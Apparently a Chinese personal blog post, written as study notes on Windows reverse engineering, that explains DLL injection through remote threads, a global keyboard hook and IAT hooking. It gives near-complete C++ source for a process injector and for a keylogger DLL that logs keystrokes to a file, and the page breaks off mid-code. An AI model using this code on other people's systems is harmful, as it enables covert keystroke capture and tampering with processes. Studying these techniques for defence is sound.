<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords"><meta name="author" content="Second_BC,undefined"><meta name="copyright" content="Second_BC"><title>【Second_BC の BloG】</title><link rel="stylesheet" href="/SecondBC/css/fan.css"><link rel="stylesheet" href="/SecondBC/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/SecondBC/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/SecondBC/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/SecondBC/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: ,
  valine: ,
}</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/SecondBC/atom.xml" title="Second_BC の BloG" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="author-info"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/SecondBC/ss.jpg"></div><div class="author-info-name">Second_BC</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/" target="_blank">GitHub<i class="icon-dot bg-color3"></i></a><a class="links-button button-hover" href="mailto:1" target="_blank">E-Mail<i class="icon-dot bg-color8"></i></a><a class="links-button button-hover" href="tencent://message/?uin=2&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color9"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/SecondBC/archives"><span class="pull-top">日志</span><span class="pull-bottom">22</span></a><a class="author-info-articles-tags article-meta" href="/SecondBC/tags"><span class="pull-top">标签</span><span class="pull-bottom">9</span></a><a class="author-info-articles-categories article-meta" href="/SecondBC/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/SecondBC">首页</a><a class="menu-item" href="/SecondBC/archives">归档</a><a class="menu-item" href="/SecondBC/categories">分类</a><a class="menu-item" href="/SecondBC/tags">标签</a><a class="menu-item" href="/SecondBC/about">关于</a></nav><div class="right-info"><a class="title-name" href="/SecondBC/">Second_BC の BloG</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><div id="recent-posts"><!-- each post in page.posts.sort('date', -1).limit(10).toArray()--><!-- config中配置按照什么排序--><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/12/12/DLL%E6%B3%A8%E5%85%A5%E4%B8%8EHOOK/">DLL注入与HOOK</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-12-12</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Reverse/">Reverse</a></div></div><div class="post-content"><div class="main-content content"><p>首先啊，首先啊；</p>
<p>你得了解windows编程及其基于消息的处理机制，DllMain函数；</p>
<p>不然就会看不懂或者啃着异常难受核心原理第三章；</p>
<h2 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h2><p>dll为文件后缀名，称为dynamic link library，动态链接库，一般用于存储方法和函数，进程运行时动态地调用其函数；</p>
<p>其显示调用命令为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">LoadLibrary</span>(<span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>dll注入，顾名思义，将已有进程，使其调用不属于它本身的dll文件，称为dll注入；</p>
<p>一般用于对已经做好的软件进行升级扩展和修补漏洞，也可用于外挂；</p>
<h3 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h3><p>根据dll注入的本意，很轻易的可以想到通过创建远程进程的子线程对其进行 LoadLibrary 操作；</p>
<p>利用windows API，于是有以下操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开进程</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建进程中的线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, ThreadProc, dll_path, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>其中，ThreadProc 是线程回调函数，也就是线程内容，可以在其中执行 LoadLibrary；</p>
<p>但由于其特殊性，该回调函数的特征类似于LoadLibrary函数，都只有一个参数，而且类型可以说是一样的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//回调</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ LPVOID lpParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LoadLibrary</span></span><br><span class="line"><span class="function">HMODULE <span class="title">LoadLibraryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>所以创建线程可以写成如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, dll_path, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>但有个问题？这里的dll_path传参数是本进程的地址，如果直接这么用，那么目标进程执行时，就会造成调用越界出错；</p>
<p>所以需要dll_path写入目标进程，用windows API 实现：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[] = <span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>;</span><br><span class="line">SIZE_T bufferSize = <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>;</span><br><span class="line">SIZE_T realWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//申请进程内存空间</span></span><br><span class="line"><span class="keyword">char</span>* str = (<span class="keyword">char</span>*)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, bufferSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;malloc err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将字符串写入该空间</span></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, str, buffer, bufferSize, &amp;realWrite);</span><br></pre></td></tr></table></figure>

<p>之后再用str去创建线程传参，就没有问题了；</p>
<p>完整代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = <span class="string">&quot;your aim pid&quot;</span>;</span><br><span class="line">	<span class="comment">//打开进程</span></span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;open fail !! &quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">char</span> buffer[] = <span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>;</span><br><span class="line">	SIZE_T bufferSize = <span class="built_in">strlen</span>(buffer) + <span class="number">1</span>;</span><br><span class="line">	SIZE_T realWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//申请进程内存空间</span></span><br><span class="line">	<span class="keyword">char</span>* str = (<span class="keyword">char</span>*)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, bufferSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;malloc err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//将字符串写入该空间</span></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(hProcess, str, buffer, bufferSize, &amp;realWrite);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建进程中的线程</span></span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, str, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;thread create err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//一直等待线程结束</span></span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//扫尾</span></span><br><span class="line">	<span class="built_in">VirtualFreeEx</span>(hProcess, str, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后写一个dll具体实现，就能将其注入了；</p>
<h2 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h2><p>钩子，和网络上的抓包很类似，在上下文中设置hook，即可捕获了解到其中的执行信息；</p>
<h3 id="消息-hook"><a href="#消息-hook" class="headerlink" title="消息 hook"></a>消息 hook</h3><p>你已经知道windows是基于消息操作的，也可以叫基于事件操作，那么将钩子设置在消息队列和进程之间的消息传输中，就叫消息hook；</p>
<p>windows提供了消息hook的API，只需要会用就行；</p>
<table>
<thead>
<tr>
<th>API</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>SetWindowsHookEx</td>
<td>设置钩子</td>
</tr>
<tr>
<td>CallNextHookEx</td>
<td>传递钩子信息到钩子链的下一个子程序</td>
</tr>
<tr>
<td>UnHookWindowsHookEx</td>
<td>卸载钩子</td>
</tr>
</tbody></table>
<p>其中有个特点需要了解：</p>
<p>进程如果被hook，那么<strong>有关其hook的dll会被强制归属于该进程</strong>，所以hook一般也写在dll中，也是一种dll注入的手段；</p>
<p>来看一个键盘记录器的实际代码；</p>
<p>首先是dll程序主函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,					<span class="comment">//实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,		<span class="comment">//调用原因或可以说是时机</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved				<span class="comment">//保留字段</span></span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:		<span class="comment">//创建进程时执行</span></span><br><span class="line">            g_hInstance = hModule;		<span class="comment">//之后hook函数需要用到的实例句柄</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后分别是hook的设置，处理，以及卸载；</p>
<p>设置HOOK：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//填0全局hook，这里选用键盘消息的勾取</span></span><br><span class="line">    g_hHook = <span class="built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_hHook)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用回调函数处理捕获信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ <span class="keyword">int</span>    code,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (code == HC_ACTION)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//键帽按下状态</span></span><br><span class="line">        <span class="keyword">if</span> ((lParam &amp; <span class="number">0x80000000</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//将虚拟键转换为字符</span></span><br><span class="line">            BYTE KeyState[<span class="number">256</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">GetKeyboardState</span>(KeyState))</span><br><span class="line">            &#123;</span><br><span class="line">                LONG keyinfo = lParam;</span><br><span class="line">                UINT keyCode = (keyinfo &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x00ff</span>;</span><br><span class="line">                WCHAR wkeyCode = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">ToAscii</span>((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wkeyCode, <span class="number">0</span>);</span><br><span class="line">                CHAR strinfo[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">                <span class="built_in">sprintf_s</span>(strinfo, _countof(strinfo), <span class="string">&quot;%c&quot;</span>, wkeyCode);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//写到桌面，这样仅仅对ascii实用</span></span><br><span class="line">                FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="built_in">fopen_s</span>(&amp;fp, <span class="string">&quot;C://your//path//to//Desktop//hook_log.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">                <span class="built_in">fwrite</span>(strinfo, <span class="number">1</span>, <span class="number">1</span>, fp);</span><br><span class="line">                <span class="built_in">fclose</span>(fp);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不处理给下一个钩子，类似于窗口的回调函数最后返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>卸载钩子：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>至此，一个拥有消息hook的dll文件产生了，再使用任意主程序调用即可；</p>
<h3 id="IAT-hook"><a href="#IAT-hook" class="headerlink" title="IAT hook"></a>IAT hook</h3><p>顾名思义，此hook是对于IAT而言，IAT即 import address table ，导入地址表，在程序变为进程时，此表存储了导入函数的地址，在磁盘形态时存储的则是其函数名称，或者序号；</p>
<p>利用该hook可以使得改变原程序调用函数为自定义函数，当然<strong>传参需要一致，调用约定需要一致</strong>；</p>
<p>先回顾下 IAT 结构：</p>
<p>先拿DOS头找到PE头，接着拿PE头找可选PE头，可选头最后一个字段是一个数组，其存放各种表的 rva；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">    DWORD   VirtualAddress;                 <span class="comment">// +0000h   -   数据的起始RVA</span></span><br><span class="line">    DWORD   Size;                           <span class="comment">// +0004h   -   数据块的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下标为1的元素即为导入表，利用rva跳转到表本身，同时注意表有多个，因为导入的dll会是多个，所以记得循环遍历；</p>
<p>导入表中的 FirstThunk即为 IAT，同时注意，IAT有多个函数地址，也需要一次循环遍历；</p>
<p><img src="https://s2.loli.net/2022/12/12/IEzTfDBN3FMZl7m.png" alt="IAT"></p>
<p>由此，寻找函数地址的函数为：（输入dll名和函数名以查询）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位程序用DWORD</span></span><br><span class="line"><span class="function">DWORD* <span class="title">GetIatAddr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* dllName, <span class="keyword">const</span> <span class="keyword">char</span>* dllFunName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取本进程的句柄，也就是载入的exe文件</span></span><br><span class="line">    HMODULE hModule = <span class="built_in">GetModuleHandleA</span>(<span class="number">0</span>);</span><br><span class="line">    DWORD buffer = (DWORD)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">//获取PE头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">//获取可选头</span></span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &amp;pNtHeader-&gt;OptionalHeader;</span><br><span class="line">    <span class="comment">//获取那个结构体数组</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY dataDirectory = &amp;pOptionalHeader-&gt;DataDirectory[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">//获取导入表</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(dataDirectory-&gt;VirtualAddress + buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历导入表</span></span><br><span class="line">    <span class="keyword">while</span> (pImportTable-&gt;Name)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span>* name = (<span class="keyword">char</span> *)(pImportTable-&gt;Name + buffer);</span><br><span class="line">        <span class="comment">//是否dll名相同</span></span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(name, dllName))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//根据名字拿地址</span></span><br><span class="line">            <span class="comment">//获取INT</span></span><br><span class="line">            PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)(pImportTable-&gt;OriginalFirstThunk + buffer);</span><br><span class="line">            <span class="comment">//获取IAT</span></span><br><span class="line">            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pImportTable-&gt;FirstThunk + buffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//同步遍历INT和IAT</span></span><br><span class="line">            <span class="keyword">while</span> (pINT-&gt;u1.Function)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//按名导入</span></span><br><span class="line">                <span class="keyword">if</span> ((pINT-&gt;u1.Ordinal &amp; <span class="number">0x80000000</span>) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)(pINT-&gt;u1.Function + buffer);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(pImportName-&gt;Name, dllFunName))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span> (DWORD*)pIAT;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                pINT++;</span><br><span class="line">                pIAT++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportTable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着便是dllMain：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//创建进程时获取函数地址，此次修改的函数是MessageBoxW</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;注入成功！\n&quot;</span>);</span><br><span class="line">            <span class="comment">//获取函数地址</span></span><br><span class="line">            g_iatAddr = <span class="built_in">GetIatAddr</span>(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">            g_preIatAddr = g_iatAddr;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置钩子</span></span><br><span class="line">            <span class="built_in">InstallHook</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//进程结束时卸载钩子</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="comment">//卸载钩子</span></span><br><span class="line">            <span class="built_in">UnInstallHook</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span 